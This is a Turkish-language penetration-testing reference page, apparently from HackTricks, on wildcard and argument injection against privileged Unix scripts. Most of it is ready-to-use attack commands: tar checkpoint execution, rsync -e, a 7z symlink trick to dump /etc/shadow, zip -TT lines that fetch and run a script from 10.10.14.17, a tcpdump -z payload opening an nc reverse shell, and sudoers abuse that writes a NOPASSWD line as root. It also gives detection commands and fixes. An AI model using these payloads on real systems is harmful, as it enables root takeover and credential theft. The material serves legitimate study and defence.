# Wildcards için Ek Hileler

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection**, ayrıcalıklı bir script'in `tar`, `chown`, `rsync`, `zip`, `7z` gibi bir Unix binary'sini tırnak içine alınmamış `*` gibi bir wildcard ile çalıştırması durumunda gerçekleşir.  
> Shell, binary'yi çalıştırmadan **önce** wildcard'ı genişlettiğinden, çalışma dizininde dosya oluşturabilen bir attacker, `-` ile başlayan dosya adları oluşturabilir. Böylece bu adlar **veri yerine seçenekler** olarak yorumlanır ve rastgele flag'ler, hatta komutlar içeri sızdırılabilir.<sup>[[6]](#references)</sup>
> Bu sayfa, 2023-2025 arasındaki en kullanışlı primitive'leri, güncel araştırmaları ve modern tespit yöntemlerini derler.

## chown / chmod

Wildcard ile genişletilen, seçenek gibi görünen bir dosya adını kullanarak `--reference` flag'ini suistimal edip **sahip/grup bilgisini veya izin bitlerini bir referans dosyasından kopyalayabilirsiniz**.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```

Root daha sonra şöyle bir şey çalıştırdığında:

```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```

Genişletilmiş `--reference=.drf.php`, açıkça belirtilen sahibi/modu geçersiz kılar; böylece eşleşen dosyalar `.drf.php` dosyasındaki meta verileri devralır (ve yukarıdaki kurulumla saldırgan tarafından yazılabilir hâle gelir).<sup>[[6]](#references)</sup>

Yalnızca `chown` satırını değil, ayrıcalıklı yardımcı programın tamamını inceleyin. Sahiplik değişikliği set-user-ID veya set-group-ID bitlerini temizleyebilir; [POSIX, ayrıcalıklı durumu uygulamaya bağlı olarak tanımsız bırakır](https://pubs.opengroup.org/onlinepubs/9699919799.2013edition/functions/chown.html). Aynı işte daha sonra çalıştırılan bir `chmod`, daha önce seçtiği dosyalarda bu bitleri geri yükleyerek sonucu değiştirebilir. Bunu çalıştırılabilir bir ayrıcalık yolu olarak değerlendirmeden önce gerçek komut sırasını, glob içeren yazılabilir dizini, etkilenen dosyayı ve bağlantı davranışını, ortaya çıkan sahip ve modu ve bağlamanın set-user-ID'yi etkinleştirip etkinleştirmediğini doğrulayın. Okunamayan bir yardımcı program, bu adımları belirsiz bırakır.

*PoC ve araç*: [`wildpwn`](https://github.com/localh0t/wildpwn) (birleşik saldırı).<sup>[[7]](#references)</sup>
Ayrıntılar için klasik DefenseCode makalesine de bakın.<sup>[[6]](#references)</sup>

---

## Ayrıcalıklı bir betikte GNU `cp`

Daha düşük ayrıcalıklı bir kullanıcının dizinde dosya adları oluşturabildiği durumlarda, çağıranın seçtiği çalışma dizininden yalın bir glob kullanarak kopyalama yapan root tarafından çalıştırılan bir betiği inceleyin. Örneğin: `cp .version * /etc/app/staged/`. GNU `cp`, `*` ile genişletilen ve tireyle başlayan bir dosya adını seçenek olarak ayrıştırabilir. `--preserve=mode` seçeneği, yeni kopyada kaynak mod bitlerini koruyabilir; `--target-directory` ise kopyalama hedefini değiştirebilir. Her iki etki de doğrulanmak için betiğin ilgili dalının, hedefin mevcut durumunun, etkin ayrıcalıkların, dosya sistemi politikasının ve GNU `cp` davranışının incelenmesini gerektirir; yalnızca bir sudo kuralının veya betiğin metni ayrıcalık yükseltmeyi kanıtlamaz. İşlenenlerin başına `./` eklemek veya seçenek ayrıştırmasını `--` ile sonlandırmak, GNU `cp` için tireyle başlayan adların seçenek olarak yorumlanmasını önler ([GNU Coreutils SSS](https://www.gnu.org/software/coreutils/faq/coreutils-faq.html), [`cp` kılavuzu](https://www.gnu.org/software/coreutils/manual/html_node/cp-invocation.html)).

---

## tar

### GNU tar

GNU tar'ın **checkpoint** özelliğini ve checkpoint eylemlerini kötüye kullanarak keyfi komutlar çalıştırın.<sup>[[10]](#references)</sup>

```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Root, örneğin `tar -czf /root/backup.tgz *` komutunu çalıştırdığında, `shell.sh` root olarak çalıştırılır.<sup>[[10]](#references)</sup>

### bsdtar / macOS sıkıştırıcı geçersiz kılma uyarısı

Yeni macOS sürümlerindeki varsayılan `tar` (`libarchive` tabanlı), GNU tar'ın `--checkpoint` arayüzünü sunmaz; ancak bsdtar, harici bir sıkıştırıcı seçmek için **--use-compress-program** seçeneğini belgeler.<sup>[[11]](#references)</sup>

```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Ayrıcalıklı bir script `tar -cf backup.tar *` çalıştırdığında, bu komut `sh` dosyasını kurbanın `PATH` değişkeni üzerinden seçer ve bsdtar onu compressor olarak başlatır.<sup>[[11]](#references)</sup> Bu, option injection olduğunu kanıtlar; ancak tek başına güvenilir bir arbitrary-command primitive değildir: wildcard ile oluşturulan bir dosya adı `/` içeremez ve bsdtar, saldırganın seçtiği bir shell komutu yerine arşiv verisi sağlar. Code execution için ayrıca `PATH` üzerinden çözümlenen veya kullanışlı bir programı belirtebilen başka bir argüman kanalı üzerinden denetlenebilir bir executable gerekir.

---

## rsync

`rsync`, `-e` ve `--rsync-path` gibi komut satırı flag’leri aracılığıyla remote shell’i veya remote binary’yi geçersiz kılmanıza olanak tanır.<sup>[[12]](#references)</sup>

```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```

root dizini daha sonra `rsync -az * backup:/srv/` komutuyla arşivlerse, enjekte edilen flag uzak-shell mekanizması üzerinden bir shell çalıştırabilir.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Ayrıcalıklı script, seçeneklerin ayrıştırılmasını durdurmak için wildcard'ın başına `--` ekleyerek *savunmacı* davransa bile, 7-Zip CLI dosya adının başına `@` eklenerek **file list files** kullanımını kabul eder. Bunu bir symlink ile birleştirerek *herhangi bir dosyayı dışarı sızdırabilirsiniz*.<sup>[[13]](#references)</sup>

```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```

root buna benzer bir şey çalıştırırsa:

```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```

7-Zip, `root.txt` dosyasını (→ `/etc/shadow`) dosya listesi olarak okumaya çalışır ve hata vererek çıkar; **içeriği stderr'e yazdırır**.<sup>[[13]](#references)</sup>

Bu yöntem `-- *` kullanıldığında da çalışır; çünkü 7-Zip CLI, konumsal girdi olarak hem normal dosya adlarını hem de `@listfiles`'ı açıkça kabul eder. Bu nedenle `@root.txt` gibi bir dosya adı özel olarak işlenmeye devam eder.<sup>[[13]](#references)</sup>

---

## zip

Bir uygulama, kullanıcı denetimindeki dosya adlarını `zip`'e (joker karakter kullanarak veya `--` olmadan adları listeleyerek) aktardığında kullanılabilecek iki pratik yöntem vardır.<sup>[[2]](#references)[[3]](#references)</sup>

- Test kancasıyla RCE: `-T`, “arşivi test et” seçeneğini etkinleştirir ve `-TT <cmd>` test programını rastgele bir programla değiştirir (uzun biçimi: `--unzip-command <cmd>`). `-` ile başlayan dosya adları ekleyebiliyorsanız, kısa seçeneklerin ayrıştırılabilmesi için bayrakları ayrı dosya adlarına bölün.<sup>[[2]](#references)[[3]](#references)</sup>

```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```

Notlar
- `'-T -TT <cmd>'` gibi tek bir dosya adı kullanmayı denemeyin — kısa seçenekler karakter karakter ayrıştırılır ve bu başarısız olur. Gösterildiği gibi ayrı token'lar kullanın.<sup>[[3]](#references)</sup>
- Uygulama dosya adlarındaki eğik çizgileri kaldırıyorsa, yalın bir host/IP'den (`/index.html` varsayılan yolu) alın ve `-O` ile yerel olarak kaydedip ardından çalıştırın.<sup>[[3]](#references)</sup>
- Token'larınızın nasıl işlendiğini anlamak için ayrıştırmayı `-sc` (işlenmiş argv'yi göster) veya `-h2` (daha fazla yardım) ile hata ayıklayabilirsiniz.<sup>[[3]](#references)</sup>

Örnek (zip 3.0'da yerel davranış).<sup>[[3]](#references)</sup>

```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```

- Data exfil/leak: Web katmanı `zip` stdout/stderr çıktısını yansıtıyorsa (naive wrapper'larda yaygındır), `--help` gibi enjekte edilen flag'ler veya hatalı seçeneklerden kaynaklanan hatalar HTTP yanıtında görünür; bu, command-line injection'ı doğrular ve payload ayarlamaya yardımcı olur.<sup>[[3]](#references)</sup>

---

## Ek option-injection adayları

Ayrıcalıklı bir wrapper, yazılabilir bir dizini wildcard ile genişlettiğinde, belgelenmiş bu option hook'larını kontrol etmeye değer.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Suistimal edilecek flag | Etki |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Bir shell'e komut dizgesi iletir |
| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push işlemlerinde SSH yerine `<cmd>` kullanır |
| `scp`   | `-S <program>` | Alternatif bir SSH uyumlu bağlantı programı kullanır |

Bu primitive'ler, klasik *tar/rsync/zip* örneklerinin ötesinde faydalı kontrollerdir.

---

## Güvenlik açığı bulunan wrapper'ları ve işleri araştırma

Yakın tarihli vaka incelemeleri ve tespit kılavuzları, wildcard/argv injection'ın artık yalnızca **cron + tar** sorunu olmadığını gösteriyor.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Aynı hata sınıfı şuralarda da görülmeye devam ediyor:

- saldırganın kontrolündeki upload dizinlerinden "her şeyi zip/tar olarak indir" işlevi sunan web özellikleri
- saldırganın kontrolündeki filename/filter alanlarını kullanan bir **tcpdump** wrapper'ı sunan vendor/appliance debug shell'leri
- yazılabilir dizinlerde `tar`, `rsync`, `7z`, `zip`, `chown` veya `chmod` çalıştıran yedekleme ya da döndürme işleri

Faydalı triage komutları (`pspy` çağrısı, belgelenmiş process/file-event ve interval flag'lerini kullanır).<sup>[[14]](#references)</sup>

```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
  '(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
  /etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```

Hızlı sezgisel kurallar:

- `-- *` birçok GNU aracı için iyi bir çözümdür, ancak `7z`/`7za` için **değildir**; çünkü `@listfiles` ayrı olarak ayrıştırılır.<sup>[[13]](#references)</sup>
- `zip` için, kullanıcı denetimindeki dosya adlarını doğrudan listeleyen wrapper'ları arayın; shell glob olmasa bile kısa seçenekleri bölme (`-T` + `-TT <cmd>`) yöntemi çalışır.<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump` için, **çıktı dosyası adlarını**, **döndürme ayarlarını** veya **capture-file replay** argümanlarını denetlemenize izin veren wrapper'lara özellikle dikkat edin.<sup>[[18]](#references)</sup>

---

## tcpdump döndürme kancaları (-G/-W/-z): Wrapper'larda argv injection yoluyla RCE

Kısıtlı bir shell veya üretici wrapper'ı, kullanıcı denetimindeki alanları (ör. bir "file name" parametresi) katı alıntılama/doğrulama olmadan birleştirerek `tcpdump` komut satırı oluşturduğunda, fazladan `tcpdump` flag'leri ekleyebilirsiniz. `-G` (zamana dayalı döndürme), `-W` (dosya sayısını sınırlandırma) ve `-z <cmd>` (döndürme sonrası komut) birleşimi, `tcpdump`'ı çalıştıran kullanıcı olarak (cihazlarda genellikle root) rastgele komut yürütülmesini sağlar.<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Ön koşullar:

- `tcpdump`'a aktarılan `argv` değerini etkileyebilmeniz gerekir (ör. `/debug/tcpdump --filter=... --file-name=<HERE>` gibi bir wrapper aracılığıyla).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper, dosya adı alanındaki boşlukları veya `-` ile başlayan token'ları temizlememelidir.<sup>[[4]](#references)</sup>

Klasik PoC (yazılabilir bir yoldaki reverse shell script'ini çalıştırır).<sup>[[4]](#references)[[18]](#references)</sup>

```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
  --file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```

Details:

- `-G 1` her saniye döndürür ve `-W 1` bir döndürülmüş dosyadan sonra durur; capture işleminin döndürme gerçekleşmeden önce eşleşen bir paket alması gerekir.<sup>[[18]](#references)</sup>
- `-z <cmd>` her döndürme işleminde post-rotate komutunu bir kez çalıştırır ve kapatılan savefile yolunu argüman olarak iletir; script/interpreter argüman işlemenin payload'ınızla eşleştiğinden emin olun.<sup>[[18]](#references)</sup>

Çıkarılabilir medya gerektirmeyen varyantlar:

- Dosya yazmak için başka bir primitive'iniz varsa (ör. çıktı yönlendirmesine izin veren ayrı bir komut wrapper'ı), script'inizi bilinen bir yola koyun ve `-z /path/script.sh` tetikleyin; gerekirse script'in `/bin/sh` çağırmasını sağlayın.<sup>[[18]](#references)</sup>
- Bir vendor wrapper döndürülmüş yolun seçilmesine izin veriyorsa, bu yol kontrolünü yalnızca savefile argümanını yorumlayan bir post-rotate komutuyla birlikte denetleyin; tek başına yol kontrolü dosya içeriğini çalıştırmaz.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Örnek sudoers anti-pattern:<sup>[[3]](#references)</sup>

```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```

Kural, tcpdump'ın belgelenmiş ayrıştırıcısında çeşitli seçeneklere izin verir:<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob'u ve izin verici desenler yalnızca ilk `-w` argümanını kısıtlar. `tcpdump` birden fazla `-w` seçeneğini kabul eder; sonuncusu geçerli olur.<sup>[[3]](#references)[[18]](#references)</sup>
- Kural diğer seçenekleri sabitlemez; dolayısıyla `-Z`, `-r`, `-V` vb. kullanılabilir.<sup>[[3]](#references)[[18]](#references)</sup>

İlgili temel işlevler aşağıda açıklanmıştır.<sup>[[3]](#references)[[18]](#references)</sup>
- İkinci bir `-w` ile hedef yolu geçersiz kılma (ilk seçenek yalnızca sudoers koşulunu karşılar).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
  -w /dev/shm/out.pcap \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- Kısıtlı ağaçtan kaçmak için ilk `-w` içinde Path traversal.<sup>[[3]](#references)</sup>

```bash
sudo tcpdump -c10 \
  -w/var/cache/captures/a/../../../../dev/shm/out \
  -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-Z root` ile çıktı sahipliğini zorlayın (her yerde root tarafından sahiplenilen dosyalar oluşturur).<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -w /dev/shm/root-owned \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

- `-r` aracılığıyla hazırlanmış bir PCAP’i yeniden oynatarak istenen içeriği yazma (ör. sudoers satırı eklemek).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Tam ASCII yükünü içeren bir PCAP oluşturup root olarak yazın</summary>

```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
  -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

</details>

- `-V <file>` ile rastgele dosya okuma/gizli bilgi leak'i (bir savefiles listesi olarak yorumlanır). Hata tanılama mesajları genellikle satırları yankılayarak içeriği sızdırır.<sup>[[3]](#references)[[18]](#references)</sup>

```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
  -w /tmp/dummy \
  -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```

---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Tam Exploit Zinciri](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard Injection Yoluyla Olası Shell Tespit Edildi](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Geleceğe Dönüş: Unix Wildcard'ları Çılgına Döndü (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` kullanımı](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` kullanımı](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar kontrol noktaları](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) kılavuzu](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) kılavuzu](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zip komut satırı sözdizimi](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) kılavuzu](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git yapılandırma belgeleri](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` kılavuzu](https://man.openbsd.org/scp)
- [18] [tcpdump(8) kılavuzu](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
